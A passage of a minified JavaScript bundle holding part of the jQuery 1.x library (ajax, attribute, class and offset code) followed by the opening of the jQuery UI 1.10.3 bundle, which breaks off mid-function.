b=n.fx?n.fx.speeds[b]||b:b,c=c||"fx",this.queue(c,function(c,d){var e=a.setTimeout(c,b);d.stop=function(){a.clearTimeout(e)}})},function(){var a,b=d.createElement("input"),c=d.createElement("div"),e=d.createElement("select"),f=e.appendChild(d.createElement("option"));c=d.createElement("div"),c.setAttribute("className","t"),c.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",a=c.getElementsByTagName("a")[0],b.setAttribute("type","checkbox"),c.appendChild(b),a=c.getElementsByTagName("a")[0],a.style.cssText="top:1px",l.getSetAttribute="t"!==c.className,l.style=/top/.test(a.getAttribute("style")),l.hrefNormalized="/a"===a.getAttribute("href"),l.checkOn=!!b.value,l.optSelected=f.selected,l.enctype=!!d.createElement("form").enctype,e.disabled=!0,l.optDisabled=!f.disabled,b=d.createElement("input"),b.setAttribute("value",""),l.input=""===b.getAttribute("value"),b.value="t",b.setAttribute("type","radio"),l.radioValue="t"===b.value}();var rb=/\r/g;n.fn.extend({val:function(a){var b,c,d,e=this[0];{if(arguments.length)return d=n.isFunction(a),this.each(function(c){var e;1===this.nodeType&&(e=d?a.call(this,c,n(this).val()):a,null==e?e="":"number"==typeof e?e+="":n.isArray(e)&&(e=n.map(e,function(a){return null==a?"":a+""})),b=n.valHooks[this.type]||n.valHooks[this.nodeName.toLowerCase()],b&&"set"in b&&void 0!==b.set(this,e,"value")||(this.value=e))});if(e)return b=n.valHooks[e.type]||n.valHooks[e.nodeName.toLowerCase()],b&&"get"in b&&void 0!==(c=b.get(e,"value"))?c:(c=e.value,"string"==typeof c?c.replace(rb,""):null==c?"":c)}}}),n.extend({valHooks:{option:{get:function(a){var b=n.find.attr(a,"value");return null!=b?b:n.trim(n.text(a))}},select:{get:function(a){for(var b,c,d=a.options,e=a.selectedIndex,f="select-one"===a.type||0>e,g=f?null:[],h=f?e+1:d.length,i=0>e?h:f?e:0;h>i;i++)if(c=d[i],(c.selected||i===e)&&(l.optDisabled?!c.disabled:null===c.getAttribute("disabled"))&&(!c.parentNode.disabled||!n.nodeName(c.parentNode,"optgroup"))){if(b=n(c).val(),f)return b;g.push(b)}return g},set:function(a,b){var c,d,e=a.options,f=n.makeArray(b),g=e.length;while(g--)if(d=e[g],n.inArray(n.valHooks.option.get(d),f)>=0)try{d.selected=c=!0}catch(h){d.scrollHeight}else d.selected=!1;return c||(a.selectedIndex=-1),e}}}}),n.each(["radio","checkbox"],function(){n.valHooks[this]={set:function(a,b){return n.isArray(b)?a.checked=n.inArray(n(a).val(),b)>-1:void 0}},l.checkOn||(n.valHooks[this].get=function(a){return null===a.getAttribute("value")?"on":a.value})});var sb,tb,ub=n.expr.attrHandle,vb=/^(?:checked|selected)$/i,wb=l.getSetAttribute,xb=l.input;n.fn.extend({attr:function(a,b){return Y(this,n.attr,a,b,arguments.length>1)},removeAttr:function(a){return this.each(function(){n.removeAttr(this,a)})}}),n.extend({attr:function(a,b,c){var d,e,f=a.nodeType;if(3!==f&&8!==f&&2!==f)return"undefined"==typeof a.getAttribute?n.prop(a,b,c):(1===f&&n.isXMLDoc(a)||(b=b.toLowerCase(),e=n.attrHooks[b]||(n.expr.match.bool.test(b)?tb:sb)),void 0!==c?null===c?void n.removeAttr(a,b):e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:(a.setAttribute(b,c+""),c):e&&"get"in e&&null!==(d=e.get(a,b))?d:(d=n.find.attr(a,b),null==d?void 0:d))},attrHooks:{type:{set:function(a,b){if(!l.radioValue&&"radio"===b&&n.nodeName(a,"input")){var c=a.value;return a.setAttribute("type",b),c&&(a.value=c),b}}}},removeAttr:function(a,b){var c,d,e=0,f=b&&b.match(G);if(f&&1===a.nodeType)while(c=f[e++])d=n.propFix[c]||c,n.expr.match.bool.test(c)?xb&&wb||!vb.test(c)?a[d]=!1:a[n.camelCase("default-"+c)]=a[d]=!1:n.attr(a,c,""),a.removeAttribute(wb?c:d)}}),tb={set:function(a,b,c){return b===!1?n.removeAttr(a,c):xb&&wb||!vb.test(c)?a.setAttribute(!wb&&n.propFix[c]||c,c):a[n.camelCase("default-"+c)]=a[c]=!0,c}},n.each(n.expr.match.bool.source.match(/\w+/g),function(a,b){var c=ub[b]||n.find.attr;xb&&wb||!vb.test(b)?ub[b]=function(a,b,d){var e,f;return d||(f=ub[b],ub[b]=e,e=null!=c(a,b,d)?b.toLowerCase():null,ub[b]=f),e}:ub[b]=function(a,b,c){return c?void 0:a[n.camelCase("default-"+b)]?b.toLowerCase():null}}),xb&&wb||(n.attrHooks.value={set:function(a,b,c){return n.nodeName(a,"input")?void(a.defaultValue=b):sb&&sb.set(a,b,c)}}),wb||(sb={set:function(a,b,c){var d=a.getAttributeNode(c);return d||a.setAttributeNode(d=a.ownerDocument.createAttribute(c)),d.value=b+="","value"===c||b===a.getAttribute(c)?b:void 0}},ub.id=ub.name=ub.coords=function(a,b,c){var d;return c?void 0:(d=a.getAttributeNode(b))&&""!==d.value?d.value:null},n.valHooks.button={get:function(a,b){var c=a.getAttributeNode(b);return c&&c.specified?c.value:void 0},set:sb.set},n.attrHooks.contenteditable={set:function(a,b,c){sb.set(a,""===b?!1:b,c)}},n.each(["width","height"],function(a,b){n.attrHooks[b]={set:function(a,c){return""===c?(a.setAttribute(b,"auto"),c):void 0}}})),l.style||(n.attrHooks.style={get:function(a){return a.style.cssText||void 0},set:function(a,b){return a.style.cssText=b+""}});var yb=/^(?:input|select|textarea|button|object)$/i,zb=/^(?:a|area)$/i;n.fn.extend({prop:function(a,b){return Y(this,n.prop,a,b,arguments.length>1)},removeProp:function(a){return a=n.propFix[a]||a,this.each(function(){try{this[a]=void 0,delete this[a]}catch(b){}})}}),n.extend({prop:function(a,b,c){var d,e,f=a.nodeType;if(3!==f&&8!==f&&2!==f)return 1===f&&n.isXMLDoc(a)||(b=n.propFix[b]||b,e=n.propHooks[b]),void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!==(d=e.get(a,b))?d:a[b]},propHooks:{tabIndex:{get:function(a){var b=n.find.attr(a,"tabindex");return b?parseInt(b,10):yb.test(a.nodeName)||zb.test(a.nodeName)&&a.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),l.hrefNormalized||n.each(["href","src"],function(a,b){n.propHooks[b]={get:function(a){return a.getAttribute(b,4)}}}),l.optSelected||(n.propHooks.selected={get:function(a){var b=a.parentNode;return b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex),null}}),n.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){n.propFix[this.toLowerCase()]=this}),l.enctype||(n.propFix.enctype="encoding");var Ab=/[\t\r\n\f]/g;function Bb(a){return n.attr(a,"class")||""}n.fn.extend({addClass:function(a){var b,c,d,e,f,g,h,i=0;if(n.isFunction(a))return this.each(function(b){n(this).addClass(a.call(this,b,Bb(this)))});if("string"==typeof a&&a){b=a.match(G)||[];while(c=this[i++])if(e=Bb(c),d=1===c.nodeType&&(" "+e+" ").replace(Ab," ")){g=0;while(f=b[g++])d.indexOf(" "+f+" ")<0&&(d+=f+" ");h=n.trim(d),e!==h&&n.attr(c,"class",h)}}return this},removeClass:function(a){var b,c,d,e,f,g,h,i=0;if(n.isFunction(a))return this.each(function(b){n(this).removeClass(a.call(this,b,Bb(this)))});if(!arguments.length)return this.attr("class","");if("string"==typeof a&&a){b=a.match(G)||[];while(c=this[i++])if(e=Bb(c),d=1===c.nodeType&&(" "+e+" ").replace(Ab," ")){g=0;while(f=b[g++])while(d.indexOf(" "+f+" ")>-1)d=d.replace(" "+f+" "," ");h=n.trim(d),e!==h&&n.attr(c,"class",h)}}return this},toggleClass:function(a,b){var c=typeof a;return"boolean"==typeof b&&"string"===c?b?this.addClass(a):this.removeClass(a):n.isFunction(a)?this.each(function(c){n(this).toggleClass(a.call(this,c,Bb(this),b),b)}):this.each(function(){var b,d,e,f;if("string"===c){d=0,e=n(this),f=a.match(G)||[];while(b=f[d++])e.hasClass(b)?e.removeClass(b):e.addClass(b)}else(void 0===a||"boolean"===c)&&(b=Bb(this),b&&n._data(this,"__className__",b),n.attr(this,"class",b||a===!1?"":n._data(this,"__className__")||""))})},hasClass:function(a){var b,c,d=0;b=" "+a+" ";while(c=this[d++])if(1===c.nodeType&&(" "+Bb(c)+" ").replace(Ab," ").indexOf(b)>-1)return!0;return!1}}),n.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){n.fn[b]=function(a,c){return arguments.length>0?this.on(b,null,a,c):this.trigger(b)}}),n.fn.extend({hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var Cb=a.location,Db=n.now(),Eb=/\?/,Fb=/(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;n.parseJSON=function(b){if(a.JSON&&a.JSON.parse)return a.JSON.parse(b+"");var c,d=null,e=n.trim(b+"");return e&&!n.trim(e.replace(Fb,function(a,b,e,f){return c&&b&&(d=0),0===d?a:(c=e||b,d+=!f-!e,"")}))?Function("return "+e)():n.error("Invalid JSON: "+b)},n.parseXML=function(b){var c,d;if(!b||"string"!=typeof b)return null;try{a.DOMParser?(d=new a.DOMParser,c=d.parseFromString(b,"text/xml")):(c=new a.ActiveXObject("Microsoft.XMLDOM"),c.async="false",c.loadXML(b))}catch(e){c=void 0}return c&&c.documentElement&&!c.getElementsByTagName("parsererror").length||n.error("Invalid XML: "+b),c};var Gb=/#.*$/,Hb=/([?&])_=[^&]*/,Ib=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,Jb=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Kb=/^(?:GET|HEAD)$/,Lb=/^\/\//,Mb=/^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,Nb={},Ob={},Pb="*/".concat("*"),Qb=Cb.href,Rb=Mb.exec(Qb.toLowerCase())||[];function Sb(a){return function(b,c){"string"!=typeof b&&(c=b,b="*");var d,e=0,f=b.toLowerCase().match(G)||[];if(n.isFunction(c))while(d=f[e++])"+"===d.charAt(0)?(d=d.slice(1)||"*",(a[d]=a[d]||[]).unshift(c)):(a[d]=a[d]||[]).push(c)}}function Tb(a,b,c,d){var e={},f=a===Ob;function g(h){var i;return e[h]=!0,n.each(a[h]||[],function(a,h){var j=h(b,c,d);return"string"!=typeof j||f||e[j]?f?!(i=j):void 0:(b.dataTypes.unshift(j),g(j),!1)}),i}return g(b.dataTypes[0])||!e["*"]&&g("*")}function Ub(a,b){var c,d,e=n.ajaxSettings.flatOptions||{};for(d in b)void 0!==b[d]&&((e[d]?a:c||(c={}))[d]=b[d]);return c&&n.extend(!0,a,c),a}function Vb(a,b,c){var d,e,f,g,h=a.contents,i=a.dataTypes;while("*"===i[0])i.shift(),void 0===e&&(e=a.mimeType||b.getResponseHeader("Content-Type"));if(e)for(g in h)if(h[g]&&h[g].test(e)){i.unshift(g);break}if(i[0]in c)f=i[0];else{for(g in c){if(!i[0]||a.converters[g+" "+i[0]]){f=g;break}d||(d=g)}f=f||d}return f?(f!==i[0]&&i.unshift(f),c[f]):void 0}function Wb(a,b,c,d){var e,f,g,h,i,j={},k=a.dataTypes.slice();if(k[1])for(g in a.converters)j[g.toLowerCase()]=a.converters[g];f=k.shift();while(f)if(a.responseFields[f]&&(c[a.responseFields[f]]=b),!i&&d&&a.dataFilter&&(b=a.dataFilter(b,a.dataType)),i=f,f=k.shift())if("*"===f)f=i;else if("*"!==i&&i!==f){if(g=j[i+" "+f]||j["* "+f],!g)for(e in j)if(h=e.split(" "),h[1]===f&&(g=j[i+" "+h[0]]||j["* "+h[0]])){g===!0?g=j[e]:j[e]!==!0&&(f=h[0],k.unshift(h[1]));break}if(g!==!0)if(g&&a["throws"])b=g(b);else try{b=g(b)}catch(l){return{state:"parsererror",error:g?l:"No conversion from "+i+" to "+f}}}return{state:"success",data:b}}n.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Qb,type:"GET",isLocal:Jb.test(Rb[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Pb,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":n.parseJSON,"text xml":n.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(a,b){return b?Ub(Ub(a,n.ajaxSettings),b):Ub(n.ajaxSettings,a)},ajaxPrefilter:Sb(Nb),ajaxTransport:Sb(Ob),ajax:function(b,c){"object"==typeof b&&(c=b,b=void 0),c=c||{};var d,e,f,g,h,i,j,k,l=n.ajaxSetup({},c),m=l.context||l,o=l.context&&(m.nodeType||m.jquery)?n(m):n.event,p=n.Deferred(),q=n.Callbacks("once memory"),r=l.statusCode||{},s={},t={},u=0,v="canceled",w={readyState:0,getResponseHeader:function(a){var b;if(2===u){if(!k){k={};while(b=Ib.exec(g))k[b[1].toLowerCase()]=b[2]}b=k[a.toLowerCase()]}return null==b?null:b},getAllResponseHeaders:function(){return 2===u?g:null},setRequestHeader:function(a,b){var c=a.toLowerCase();return u||(a=t[c]=t[c]||a,s[a]=b),this},overrideMimeType:function(a){return u||(l.mimeType=a),this},statusCode:function(a){var b;if(a)if(2>u)for(b in a)r[b]=[r[b],a[b]];else w.always(a[w.status]);return this},abort:function(a){var b=a||v;return j&&j.abort(b),y(0,b),this}};if(p.promise(w).complete=q.add,w.success=w.done,w.error=w.fail,l.url=((b||l.url||Qb)+"").replace(Gb,"").replace(Lb,Rb[1]+"//"),l.type=c.method||c.type||l.method||l.type,l.dataTypes=n.trim(l.dataType||"*").toLowerCase().match(G)||[""],null==l.crossDomain&&(d=Mb.exec(l.url.toLowerCase()),l.crossDomain=!(!d||d[1]===Rb[1]&&d[2]===Rb[2]&&(d[3]||("http:"===d[1]?"80":"443"))===(Rb[3]||("http:"===Rb[1]?"80":"443")))),l.data&&l.processData&&"string"!=typeof l.data&&(l.data=n.param(l.data,l.traditional)),Tb(Nb,l,c,w),2===u)return w;i=n.event&&l.global,i&&0===n.active++&&n.event.trigger("ajaxStart"),l.type=l.type.toUpperCase(),l.hasContent=!Kb.test(l.type),f=l.url,l.hasContent||(l.data&&(f=l.url+=(Eb.test(f)?"&":"?")+l.data,delete l.data),l.cache===!1&&(l.url=Hb.test(f)?f.replace(Hb,"$1_="+Db++):f+(Eb.test(f)?"&":"?")+"_="+Db++)),l.ifModified&&(n.lastModified[f]&&w.setRequestHeader("If-Modified-Since",n.lastModified[f]),n.etag[f]&&w.setRequestHeader("If-None-Match",n.etag[f])),(l.data&&l.hasContent&&l.contentType!==!1||c.contentType)&&w.setRequestHeader("Content-Type",l.contentType),w.setRequestHeader("Accept",l.dataTypes[0]&&l.accepts[l.dataTypes[0]]?l.accepts[l.dataTypes[0]]+("*"!==l.dataTypes[0]?", "+Pb+"; q=0.01":""):l.accepts["*"]);for(e in l.headers)w.setRequestHeader(e,l.headers[e]);if(l.beforeSend&&(l.beforeSend.call(m,w,l)===!1||2===u))return w.abort();v="abort";for(e in{success:1,error:1,complete:1})w[e](l[e]);if(j=Tb(Ob,l,c,w)){if(w.readyState=1,i&&o.trigger("ajaxSend",[w,l]),2===u)return w;l.async&&l.timeout>0&&(h=a.setTimeout(function(){w.abort("timeout")},l.timeout));try{u=1,j.send(s,y)}catch(x){if(!(2>u))throw x;y(-1,x)}}else y(-1,"No Transport");function y(b,c,d,e){var k,s,t,v,x,y=c;2!==u&&(u=2,h&&a.clearTimeout(h),j=void 0,g=e||"",w.readyState=b>0?4:0,k=b>=200&&300>b||304===b,d&&(v=Vb(l,w,d)),v=Wb(l,v,w,k),k?(l.ifModified&&(x=w.getResponseHeader("Last-Modified"),x&&(n.lastModified[f]=x),x=w.getResponseHeader("etag"),x&&(n.etag[f]=x)),204===b||"HEAD"===l.type?y="nocontent":304===b?y="notmodified":(y=v.state,s=v.data,t=v.error,k=!t)):(t=y,(b||!y)&&(y="error",0>b&&(b=0))),w.status=b,w.statusText=(c||y)+"",k?p.resolveWith(m,[s,y,w]):p.rejectWith(m,[w,y,t]),w.statusCode(r),r=void 0,i&&o.trigger(k?"ajaxSuccess":"ajaxError",[w,l,k?s:t]),q.fireWith(m,[w,y]),i&&(o.trigger("ajaxComplete",[w,l]),--n.active||n.event.trigger("ajaxStop")))}return w},getJSON:function(a,b,c){return n.get(a,b,c,"json")},getScript:function(a,b){return n.get(a,void 0,b,"script")}}),n.each(["get","post"],function(a,b){n[b]=function(a,c,d,e){return n.isFunction(c)&&(e=e||d,d=c,c=void 0),n.ajax(n.extend({url:a,type:b,dataType:e,data:c,success:d},n.isPlainObject(a)&&a))}}),n._evalUrl=function(a){return n.ajax({url:a,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,"throws":!0})},n.fn.extend({wrapAll:function(a){if(n.isFunction(a))return this.each(function(b){n(this).wrapAll(a.call(this,b))});if(this[0]){var b=n(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&1===a.firstChild.nodeType)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){return n.isFunction(a)?this.each(function(b){n(this).wrapInner(a.call(this,b))}):this.each(function(){var b=n(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=n.isFunction(a);return this.each(function(c){n(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){n.nodeName(this,"body")||n(this).replaceWith(this.childNodes)}).end()}});function Xb(a){return a.style&&a.style.display||n.css(a,"display")}function Yb(a){while(a&&1===a.nodeType){if("none"===Xb(a)||"hidden"===a.type)return!0;a=a.parentNode}return!1}n.expr.filters.hidden=function(a){return l.reliableHiddenOffsets()?a.offsetWidth<=0&&a.offsetHeight<=0&&!a.getClientRects().length:Yb(a)},n.expr.filters.visible=function(a){return!n.expr.filters.hidden(a)};var Zb=/%20/g,$b=/\[\]$/,_b=/\r?\n/g,ac=/^(?:submit|button|image|reset|file)$/i,bc=/^(?:input|select|textarea|keygen)/i;function cc(a,b,c,d){var e;if(n.isArray(b))n.each(b,function(b,e){c||$b.test(a)?d(a,e):cc(a+"["+("object"==typeof e&&null!=e?b:"")+"]",e,c,d)});else if(c||"object"!==n.type(b))d(a,b);else for(e in b)cc(a+"["+e+"]",b[e],c,d)}n.param=function(a,b){var c,d=[],e=function(a,b){b=n.isFunction(b)?b():null==b?"":b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};if(void 0===b&&(b=n.ajaxSettings&&n.ajaxSettings.traditional),n.isArray(a)||a.jquery&&!n.isPlainObject(a))n.each(a,function(){e(this.name,this.value)});else for(c in a)cc(c,a[c],b,e);return d.join("&").replace(Zb,"+")},n.fn.extend({serialize:function(){return n.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var a=n.prop(this,"elements");return a?n.makeArray(a):this}).filter(function(){var a=this.type;return this.name&&!n(this).is(":disabled")&&bc.test(this.nodeName)&&!ac.test(a)&&(this.checked||!Z.test(a))}).map(function(a,b){var c=n(this).val();return null==c?null:n.isArray(c)?n.map(c,function(a){return{name:b.name,value:a.replace(_b,"\r\n")}}):{name:b.name,value:c.replace(_b,"\r\n")}}).get()}}),n.ajaxSettings.xhr=void 0!==a.ActiveXObject?function(){return this.isLocal?hc():d.documentMode>8?gc():/^(get|post|head|put|delete|options)$/i.test(this.type)&&gc()||hc()}:gc;var dc=0,ec={},fc=n.ajaxSettings.xhr();a.attachEvent&&a.attachEvent("onunload",function(){for(var a in ec)ec[a](void 0,!0)}),l.cors=!!fc&&"withCredentials"in fc,fc=l.ajax=!!fc,fc&&n.ajaxTransport(function(b){if(!b.crossDomain||l.cors){var c;return{send:function(d,e){var f,g=b.xhr(),h=++dc;if(g.open(b.type,b.url,b.async,b.username,b.password),b.xhrFields)for(f in b.xhrFields)g[f]=b.xhrFields[f];b.mimeType&&g.overrideMimeType&&g.overrideMimeType(b.mimeType),b.crossDomain||d["X-Requested-With"]||(d["X-Requested-With"]="XMLHttpRequest");for(f in d)void 0!==d[f]&&g.setRequestHeader(f,d[f]+"");g.send(b.hasContent&&b.data||null),c=function(a,d){var f,i,j;if(c&&(d||4===g.readyState))if(delete ec[h],c=void 0,g.onreadystatechange=n.noop,d)4!==g.readyState&&g.abort();else{j={},f=g.status,"string"==typeof g.responseText&&(j.text=g.responseText);try{i=g.statusText}catch(k){i=""}f||!b.isLocal||b.crossDomain?1223===f&&(f=204):f=j.text?200:404}j&&e(f,i,j,g.getAllResponseHeaders())},b.async?4===g.readyState?a.setTimeout(c):g.onreadystatechange=ec[h]=c:c()},abort:function(){c&&c(void 0,!0)}}}});function gc(){try{return new a.XMLHttpRequest}catch(b){}}function hc(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}n.ajaxPrefilter(function(a){a.crossDomain&&(a.contents.script=!1)}),n.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(a){return n.globalEval(a),a}}}),n.ajaxPrefilter("script",function(a){void 0===a.cache&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),n.ajaxTransport("script",function(a){if(a.crossDomain){var b,c=d.head||n("head")[0]||d.documentElement;return{send:function(e,f){b=d.createElement("script"),b.async=!0,a.scriptCharset&&(b.charset=a.scriptCharset),b.src=a.url,b.onload=b.onreadystatechange=function(a,c){(c||!b.readyState||/loaded|complete/.test(b.readyState))&&(b.onload=b.onreadystatechange=null,b.parentNode&&b.parentNode.removeChild(b),b=null,c||f(200,"success"))},c.insertBefore(b,c.firstChild)},abort:function(){b&&b.onload(void 0,!0)}}}});var ic=[],jc=/(=)\?(?=&|$)|\?\?/;n.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var a=ic.pop()||n.expando+"_"+Db++;return this[a]=!0,a}}),n.ajaxPrefilter("json jsonp",function(b,c,d){var e,f,g,h=b.jsonp!==!1&&(jc.test(b.url)?"url":"string"==typeof b.data&&0===(b.contentType||"").indexOf("application/x-www-form-urlencoded")&&jc.test(b.data)&&"data");return h||"jsonp"===b.dataTypes[0]?(e=b.jsonpCallback=n.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,h?b[h]=b[h].replace(jc,"$1"+e):b.jsonp!==!1&&(b.url+=(Eb.test(b.url)?"&":"?")+b.jsonp+"="+e),b.converters["script json"]=function(){return g||n.error(e+" was not called"),g[0]},b.dataTypes[0]="json",f=a[e],a[e]=function(){g=arguments},d.always(function(){void 0===f?n(a).removeProp(e):a[e]=f,b[e]&&(b.jsonpCallback=c.jsonpCallback,ic.push(e)),g&&n.isFunction(f)&&f(g[0]),g=f=void 0}),"script"):void 0}),l.createHTMLDocument=function(){if(!d.implementation.createHTMLDocument)return!1;var a=d.implementation.createHTMLDocument("");return a.body.innerHTML="<form></form><form></form>",2===a.body.childNodes.length}(),n.parseHTML=function(a,b,c){if(!a||"string"!=typeof a)return null;"boolean"==typeof b&&(c=b,b=!1),b=b||(l.createHTMLDocument?d.implementation.createHTMLDocument(""):d);var e=x.exec(a),f=!c&&[];return e?[b.createElement(e[1])]:(e=ja([a],b,f),f&&f.length&&n(f).remove(),n.merge([],e.childNodes))};var kc=n.fn.load;n.fn.load=function(a,b,c){if("string"!=typeof a&&kc)return kc.apply(this,arguments);var d,e,f,g=this,h=a.indexOf(" ");return h>-1&&(d=n.trim(a.slice(h,a.length)),a=a.slice(0,h)),n.isFunction(b)?(c=b,b=void 0):b&&"object"==typeof b&&(e="POST"),g.length>0&&n.ajax({url:a,type:e||"GET",dataType:"html",data:b}).done(function(a){f=arguments,g.html(d?n("<div>").append(n.parseHTML(a)).find(d):a)}).always(c&&function(a,b){g.each(function(){c.apply(g,f||[a.responseText,b,a])})}),this},n.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(a,b){n.fn[b]=function(a){return this.on(b,a)}}),n.expr.filters.animated=function(a){return n.grep(n.timers,function(b){return a===b.elem}).length};function lc(a){return n.isWindow(a)?a:9===a.nodeType?a.defaultView||a.parentWindow:!1}n.offset={setOffset:function(a,b,c){var d,e,f,g,h,i,j,k=n.css(a,"position"),l=n(a),m={};"static"===k&&(a.style.position="relative"),h=l.offset(),f=n.css(a,"top"),i=n.css(a,"left"),j=("absolute"===k||"fixed"===k)&&n.inArray("auto",[f,i])>-1,j?(d=l.position(),g=d.top,e=d.left):(g=parseFloat(f)||0,e=parseFloat(i)||0),n.isFunction(b)&&(b=b.call(a,c,n.extend({},h))),null!=b.top&&(m.top=b.top-h.top+g),null!=b.left&&(m.left=b.left-h.left+e),"using"in b?b.using.call(a,m):l.css(m)}},n.fn.extend({offset:function(a){if(arguments.length)return void 0===a?this:this.each(function(b){n.offset.setOffset(this,a,b)});var b,c,d={top:0,left:0},e=this[0],f=e&&e.ownerDocument;if(f)return b=f.documentElement,n.contains(b,e)?("undefined"!=typeof e.getBoundingClientRect&&(d=e.getBoundingClientRect()),c=lc(f),{top:d.top+(c.pageYOffset||b.scrollTop)-(b.clientTop||0),left:d.left+(c.pageXOffset||b.scrollLeft)-(b.clientLeft||0)}):d},position:function(){if(this[0]){var a,b,c={top:0,left:0},d=this[0];return"fixed"===n.css(d,"position")?b=d.getBoundingClientRect():(a=this.offsetParent(),b=this.offset(),n.nodeName(a[0],"html")||(c=a.offset()),c.top+=n.css(a[0],"borderTopWidth",!0),c.left+=n.css(a[0],"borderLeftWidth",!0)),{top:b.top-c.top-n.css(d,"marginTop",!0),left:b.left-c.left-n.css(d,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var a=this.offsetParent;while(a&&!n.nodeName(a,"html")&&"static"===n.css(a,"position"))a=a.offsetParent;return a||Qa})}}),n.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(a,b){var c=/Y/.test(b);n.fn[a]=function(d){return Y(this,function(a,d,e){var f=lc(a);return void 0===e?f?b in f?f[b]:f.document.documentElement[d]:a[d]:void(f?f.scrollTo(c?n(f).scrollLeft():e,c?e:n(f).scrollTop()):a[d]=e);
},a,d,arguments.length,null)}}),n.each(["top","left"],function(a,b){n.cssHooks[b]=Ua(l.pixelPosition,function(a,c){return c?(c=Sa(a,b),Oa.test(c)?n(a).position()[b]+"px":c):void 0})}),n.each({Height:"height",Width:"width"},function(a,b){n.each({padding:"inner"+a,content:b,"":"outer"+a},function(c,d){n.fn[d]=function(d,e){var f=arguments.length&&(c||"boolean"!=typeof d),g=c||(d===!0||e===!0?"margin":"border");return Y(this,function(b,c,d){var e;return n.isWindow(b)?b.document.documentElement["client"+a]:9===b.nodeType?(e=b.documentElement,Math.max(b.body["scroll"+a],e["scroll"+a],b.body["offset"+a],e["offset"+a],e["client"+a])):void 0===d?n.css(b,c,g):n.style(b,c,d,g)},b,f?d:void 0,f,null)}})}),n.fn.extend({bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return 1===arguments.length?this.off(a,"**"):this.off(b,a||"**",c)}}),n.fn.size=function(){return this.length},n.fn.andSelf=n.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],function(){return n});var mc=a.jQuery,nc=a.$;return n.noConflict=function(b){return a.$===n&&(a.$=nc),b&&a.jQuery===n&&(a.jQuery=mc),n},b||(a.jQuery=a.$=n),n});

var $j = jQuery.noConflict();

/*! jQuery UI - v1.10.3 - 2013-05-24
* http://jqueryui.com
* Includes: jquery.ui.core.js, jquery.ui.widget.js, jquery.ui.position.js, jquery.ui.autocomplete.js, jquery.ui.datepicker.js, jquery.ui.menu.js, jquery.ui.tooltip.js, jquery.ui.effect.js, jquery.ui.effect-highlight.js
* Copyright 2013 jQuery Foundation and other contributors Licensed MIT */

(function(e,t){function i(t,i){var a,n,r,o=t.nodeName.toLowerCase();return"area"===o?(a=t.parentNode,n=a.name,t.href&&n&&"map"===a.nodeName.toLowerCase()?(r=e("img[usemap=#"+n+"]")[0],!!r&&s(r)):!1):(/input|select|textarea|button|object/.test(o)?!t.disabled:"a"===o?t.href||i:i)&&s(t)}function s(t){return e.expr.filters.visible(t)&&!e(t).parents().addBack().filter(function(){return"hidden"===e.css(this,"visibility")}).length}var a=0,n=/^ui-id-\d+$/;e.ui=e.ui||{},e.extend(e.ui,{version:"1.10.3",keyCode:{BACKSPACE:8,COMMA:188,DELETE:46,DOWN:40,END:35,ENTER:13,ESCAPE:27,HOME:36,LEFT:37,NUMPAD_ADD:107,NUMPAD_DECIMAL:110,NUMPAD_DIVIDE:111,NUMPAD_ENTER:108,NUMPAD_MULTIPLY:106,NUMPAD_SUBTRACT:109,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,RIGHT:39,SPACE:32,TAB:9,UP:38}}),e.fn.extend({focus:function(t){return function(i,s){return"number"==typeof i?this.each(function(){var t=this;setTimeout(function(){e(t).focus(),s&&s.call(t)},i)}):t.apply(this,arguments)}}(e.fn.focus),scrollParent:function(){var t;return 